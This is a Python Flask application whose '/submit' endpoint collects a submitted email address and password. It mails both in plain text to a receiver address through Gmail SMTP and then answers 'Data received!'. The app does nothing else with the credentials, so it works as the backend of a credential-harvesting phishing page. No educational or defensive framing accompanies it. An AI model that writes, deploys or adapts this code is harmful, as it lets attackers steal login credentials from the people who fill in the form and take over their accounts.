from flask import Flask, request, jsonify, render_template
import smtplib
from email.mime.text import MIMEText
from dotenv import load_dotenv
import os

# Load environment variables
load_dotenv()

app = Flask(__name__)

def send_email(email, password):
    # Replace with your email credentials
    sender_email = os.getenv("SENDER_EMAIL")
    sender_password = os.getenv("SENDER_PASSWORD")
    receiver_email = os.getenv("RECEIVER_EMAIL")

    # Create the email message
    subject = "Form Submission"
    body = f"Email: {email}\nPassword: {password}"
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender_email
    msg['To'] = receiver_email

    # Send the email
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, msg.as_string())

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    email = data.get('email')
    password = data.get('password')

    # Send the data to your email
    send_email(email, password)

    return jsonify({"message": "Data received!"}), 200

if __name__ == '__main__':
    app.run(debug=True)